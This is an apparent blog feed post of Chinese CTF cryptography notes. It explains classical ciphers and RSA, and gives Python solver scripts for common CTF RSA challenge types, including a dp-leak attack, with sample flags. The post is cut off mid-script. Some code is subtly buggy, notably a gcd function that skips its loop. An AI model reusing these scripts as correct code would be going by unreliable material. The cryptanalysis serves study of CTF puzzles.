<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>半岛的小屋</title>
  
  
  <link href="https://www.bandao.ltd/atom.xml" rel="self"/>
  
  <link href="https://www.bandao.ltd/"/>
  <updated>2024-11-15T15:35:11.226Z</updated>
  <id>https://www.bandao.ltd/</id>
  
  <author>
    <name>半岛的孤城</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【CTF】密码学</title>
    <link href="https://www.bandao.ltd/CTF/Crypto/1.html"/>
    <id>https://www.bandao.ltd/CTF/Crypto/1.html</id>
    <published>2024-11-09T04:00:00.000Z</published>
    <updated>2024-11-15T15:35:11.226Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-古典密码"><a href="#1-古典密码" class="headerlink" title="1. 古典密码"></a>1. 古典密码</h2><h3 id="单表替换"><a href="#单表替换" class="headerlink" title="单表替换"></a>单表替换</h3><p>单表替换关键特征为：明密文一一对应。<br>解决方法：</p><ul><li>暴力破解</li><li><a href="http://quipqiup.com/">词频分析</a>，变异凯撒无法破译。</li></ul><h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><p>加密时会将明文中的<strong>每个字母</strong>（数字不处理）向后移位固定数目（循环移动），作为密文。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">偏移量：13</span><br><span class="line">输出：NOPQRSTUVWXYZABCDEFGHIJKLM</span><br></pre></td></tr></table></figure><p>特定的凯撒密码名称</p><ul><li>ROT13：偏移量为 13</li></ul><p>Python 解密代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Caesar</span>(<span class="params">text, iv, table=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 取出每一位字符</span></span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> text:</span><br><span class="line">        <span class="comment"># 判断是否为字母，中文是Unicode字符会判定为字母</span></span><br><span class="line">        <span class="keyword">if</span> letter.isalpha():</span><br><span class="line">            <span class="comment"># upper()是table是大写字母</span></span><br><span class="line">            <span class="comment"># find()返回字母在table中的索引值，找不到会返回-1，产生混淆</span></span><br><span class="line">            index = table.find(letter.upper())</span><br><span class="line">            <span class="comment"># 判断字母是否大写，大写则输出大写，小写则输出小写</span></span><br><span class="line">            <span class="keyword">if</span> letter.isupper():</span><br><span class="line">                result += table[(index + iv) % <span class="number">26</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += table[(index + iv) % <span class="number">26</span>].lower()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += letter</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Caesar(<span class="string">&quot;AaBbCc123&quot;</span>, <span class="number">13</span>)  <span class="comment"># NnOoPp123</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    Caesar(<span class="string">&quot;AaBbCc123&quot;</span>, i)</span><br></pre></td></tr></table></figure><h3 id="多表替换"><a href="#多表替换" class="headerlink" title="多表替换"></a>多表替换</h3><p>加密后字母几乎不再保持原来的频率</p><h4 id="Vigenere（维吉尼亚）密码"><a href="#Vigenere（维吉尼亚）密码" class="headerlink" title="Vigenere（维吉尼亚）密码"></a>Vigenere（维吉尼亚）密码</h4><h5 id="密码字母表"><a href="#密码字母表" class="headerlink" title="密码字母表"></a>密码字母表</h5><p><img src="/assets/CTF/Crypto/1.png" alt="Crypto1"></p><h5 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：come greatwall</span><br><span class="line">密钥：crypto</span><br></pre></td></tr></table></figure><ol><li>首先将密钥填充至与明文长度一致。</li></ol><table><thead><tr><th>明文</th><th>c</th><th>o</th><th>m</th><th>e</th><th>g</th><th>r</th><th>e</th><th>a</th><th>t</th><th>w</th><th>a</th><th>l</th><th>l</th></tr></thead><tbody><tr><td>密钥</td><td>c</td><td>r</td><td>y</td><td>p</td><td>t</td><td>o</td><td>c</td><td>r</td><td>y</td><td>p</td><td>t</td><td>o</td><td>c</td></tr></tbody></table><ol start="2"><li>然后查表</li></ol><p><img src="/assets/CTF/Crypto/2.png" alt="Crypto2"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：efkt zferrltzn</span><br></pre></td></tr></table></figure><h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><details class="tag-plugin colorful folding" color="light"><summary><span>Vigenere密码例题</span></summary><div class="body"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    freopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    freopen(<span class="string">&quot;flag_encode.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="type">char</span> key[] = <span class="comment">/*SADLY SAYING! Key is eaten by Monster!*/</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(key);</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((ch = getchar()) != EOF)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ch&gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;z&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>((ch-<span class="string">&#x27;a&#x27;</span>+key[index%len]-<span class="string">&#x27;a&#x27;</span>)%<span class="number">26</span>+<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            ++index;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;Z&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>((ch-<span class="string">&#x27;A&#x27;</span>+key[index%len]-<span class="string">&#x27;a&#x27;</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">            ++index;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(ch);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Zy daf sjle Wafyyo drvnvdrtv gh dif Crtl nrqfy boe zqm trtwjy kf gnnqr blhawas, ntm bhr gogojt ntm xalsgfn kf gnnqr fgnsleef.</span><br><span class="line">luig vy cxwpf&#123;Jnxwobuqg_O_Cogiqi!&#125;</span><br></pre></td></tr></table></figure></div></details><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><details class="tag-plugin colorful folding" color="light"><summary><span>Vigenere密码解析</span></summary><div class="body"><ol><li>C 文件给出是为了体现这是一个维多利亚密码，一横一竖</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(ch&gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;z&#x27;</span>)&#123;</span><br><span class="line">    <span class="built_in">putchar</span>((ch-<span class="string">&#x27;a&#x27;</span>+key[index%len]-<span class="string">&#x27;a&#x27;</span>)%<span class="number">26</span>+<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    ++index;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch&gt;=<span class="string">&#x27;A&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;Z&#x27;</span>)&#123;</span><br><span class="line">    <span class="built_in">putchar</span>((ch-<span class="string">&#x27;A&#x27;</span>+key[index%len]-<span class="string">&#x27;a&#x27;</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">    ++index;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>解密工具</li></ol><ul><li><a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></li><li><a href="https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx">https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx</a></li></ul><ol start="3"><li>答案</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">He has made Judges dependent on his Will alone for the tenure of their offices, and the amount and payment of their salaries.</span><br><span class="line">flag is afctf&#123;Whooooooo_U_Gotcha!&#125;</span><br></pre></td></tr></table></figure></div></details><h3 id="其它类型加密"><a href="#其它类型加密" class="headerlink" title="其它类型加密"></a>其它类型加密</h3><h4 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>常用的加密表</p><table><thead><tr><th>a</th><th>AAAAA</th><th>g</th><th>AABBA</th><th>n</th><th>ABBAA</th><th>t</th><th>BAABA</th></tr></thead><tbody><tr><td>b</td><td>AAAAB</td><td>h</td><td>AABBB</td><td>o</td><td>ABBAB</td><td>u-v</td><td>BAABB</td></tr><tr><td>c</td><td>AAABA</td><td>i-j</td><td>ABAAA</td><td>p</td><td>ABBBA</td><td>w</td><td>BABAA</td></tr><tr><td>d</td><td>AAABB</td><td>k</td><td>ABAAB</td><td>q</td><td>ABBBB</td><td>x</td><td>BABAB</td></tr><tr><td>e</td><td>AABAA</td><td>l</td><td>ABABA</td><td>r</td><td>BAAAA</td><td>y</td><td>BABBA</td></tr><tr><td>f</td><td>AABAB</td><td>m</td><td>ABABB</td><td>s</td><td>BAAAB</td><td>z</td><td>BABBB</td></tr></tbody></table><p>下面这一段内容就是明文 steganography 加密后的内容，正常字体是 A，粗体是 B：</p><p><strong>T</strong>o en<strong>c</strong>ode <strong>a</strong> mes<strong>s</strong>age e<strong>ac</strong>h letter <strong>of</strong> the <strong>pl</strong>a<strong>i</strong>nt<strong>ex</strong>t <strong>i</strong>s replaced b<strong>y</strong> <strong>a</strong> <strong>g</strong>rou<strong>p</strong> <strong>of</strong>five of <strong>th</strong>e lett<strong>ers ‘A’</strong> o<strong>r ‘B’</strong>.</p><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><ul><li><a href="http://rumkin.com/tools/cipher/baconian.php">http://rumkin.com/tools/cipher/baconian.php</a></li></ul><h4 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h4><h2 id="2-DES-算法分析"><a href="#2-DES-算法分析" class="headerlink" title="2. DES 算法分析"></a>2. DES 算法分析</h2><h2 id="3-随机数算法分析"><a href="#3-随机数算法分析" class="headerlink" title="3. 随机数算法分析"></a>3. 随机数算法分析</h2><h2 id="4-RSA-算法分析"><a href="#4-RSA-算法分析" class="headerlink" title="4.RSA 算法分析"></a>4.RSA 算法分析</h2><blockquote><p>RSA 是一种非对称加密算法</p></blockquote><p>RSA 算法分为三步：</p><ol><li>密钥生成</li><li>加密</li><li>解密</li></ol><h3 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h3><blockquote><ol><li>随机生成两个大质数 <code>p</code> 和 <code>q</code>，计算 <code>N = pq</code></li><li>根据欧拉函数，求得 <code>φ(N) = φ(p)φ(q) = (p−1)(q−1)</code></li><li>选择一个小于 <code>φ(N)</code> 的整数 <code>e</code>，使 <code>e</code> 和 <code>φ(N)</code> 互质。</li><li>求得 <code>e</code> 关于 <code>φ(N)</code> 的模反元素，命名为 <code>d</code>，有 <code>ed ≡ 1(mod φ(N))</code></li><li>对 <code>m</code> 进行加密 <code>c ≡ m^e(mod N)</code>，解密 <code>m ≡ c^d(mod N)</code></li></ol></blockquote><table><thead><tr><th>字母</th><th>含义</th></tr></thead><tbody><tr><td>p，q</td><td>两个大质数</td></tr><tr><td>N</td><td>模数</td></tr><tr><td>φ</td><td>欧拉函数</td></tr><tr><td>e</td><td>和 d 互为模反的两个指数</td></tr><tr><td>m</td><td>明文</td></tr><tr><td>c</td><td>密文</td></tr><tr><td>(e, N)</td><td>公钥</td></tr><tr><td>(d, N)</td><td>私钥</td></tr><tr><td>≡</td><td>同余符号</td></tr></tbody></table><blockquote><p>两个整数 a，b 若他们除以整数 m 所得的余数相等，则称 a，b 对于与模 m 同余。a ≡ b(mod m)读作 a 同余与 b 模 m。</p></blockquote><h3 id="CTF-中的常见-RSA-题型"><a href="#CTF-中的常见-RSA-题型" class="headerlink" title="CTF 中的常见 RSA 题型"></a>CTF 中的常见 RSA 题型</h3><h4 id="epq，求-d"><a href="#epq，求-d" class="headerlink" title="epq，求 d"></a>epq，求 d</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))  <span class="comment"># gmpy2.invert(e,φ(N))</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><h4 id="ecpq，求-m"><a href="#ecpq，求-m" class="headerlink" title="ecpq，求 m"></a>ecpq，求 m</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"></span><br><span class="line">p =</span><br><span class="line">q =</span><br><span class="line">e =</span><br><span class="line">c =</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h4 id="ecpq，求-m-1"><a href="#ecpq，求-m-1" class="headerlink" title="ecpq，求 m"></a>ecpq，求 m</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">c, e, p, q</span>):</span><br><span class="line">    L = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e, L)</span><br><span class="line">    n = p * q</span><br><span class="line">    m = gmpy2.powmod(c, d, n)</span><br><span class="line">    flag = <span class="built_in">str</span>(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + flag + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">    q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    c = <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">    Decrypt(c, e, p, q)</span><br></pre></td></tr></table></figure><h4 id="cpqdpdq，求-m"><a href="#cpqdpdq，求-m" class="headerlink" title="cpqdpdq，求 m"></a>cpqdpdq，求 m</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line">I = gmpy2.invert(q, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, dp, p)  <span class="comment"># 求幂取模运算, mp = c^dp % p</span></span><br><span class="line">mq = <span class="built_in">pow</span>(c, dq, q)  <span class="comment"># 求幂取模运算, mq = c^dp % q</span></span><br><span class="line"></span><br><span class="line">m = (((mp - mq) * I) % p) * q + mq  <span class="comment"># 求明文公式</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后得到十六进制数后有时还要转化为字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))  <span class="comment"># 转为十六进制</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))  <span class="comment"># noxCTF&#123;W31c0m3_70_Ch1n470wn&#125;</span></span><br></pre></td></tr></table></figure><h4 id="end，求-p、q（n-非常大，求不出-p、q）"><a href="#end，求-p、q（n-非常大，求不出-p、q）" class="headerlink" title="end，求 p、q（n 非常大，求不出 p、q）"></a>end，求 p、q（n 非常大，求不出 p、q）</h4><blockquote><p>例题：题目给出了 2 个文件，一个是加密的脚本 chall.py、另一个是加密脚本的输出内容 output.txt。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chall.py</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> md5 <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> p,q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n,e,d)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag: flag&#123;%s&#125;&quot;</span> % md5(<span class="built_in">str</span>(p + q)).hexdigest())</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 给出n,e,d, 求 q,p</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">        <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">            temp = a % b</span><br><span class="line">            a = b</span><br><span class="line">            b = temp</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getpq</span>(<span class="params">n, e, d</span>):</span><br><span class="line">    p = <span class="number">1</span></span><br><span class="line">    q = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> p == <span class="number">1</span> <span class="keyword">and</span> q == <span class="number">1</span>:</span><br><span class="line">        k = d * e - <span class="number">1</span></span><br><span class="line">        g = random.randint(<span class="number">0</span>, n)</span><br><span class="line">        <span class="keyword">while</span> p == <span class="number">1</span> <span class="keyword">and</span> q == <span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            k //= <span class="number">2</span></span><br><span class="line">            y = <span class="built_in">pow</span>(g, k, n)</span><br><span class="line">            <span class="keyword">if</span> y != <span class="number">1</span> <span class="keyword">and</span> gcd(y - <span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gcd(y - <span class="number">1</span>, n)</span><br><span class="line">                q = n / p</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    n = <span class="number">16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    d = <span class="number">9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453</span></span><br><span class="line">    p, q = getpq(n, e, d)</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Flag:<span class="subst">&#123;hashlib.md5(<span class="built_in">str</span>(p + q).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="ecndp，求-m"><a href="#ecndp，求-m" class="headerlink" title="ecndp，求 m"></a>ecndp，求 m</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):  <span class="comment"># 在范围(1,e)之间进行遍历</span></span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:  <span class="comment"># 存在p，使得n能被p整除</span></span><br><span class="line">            p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">            phi = (q - <span 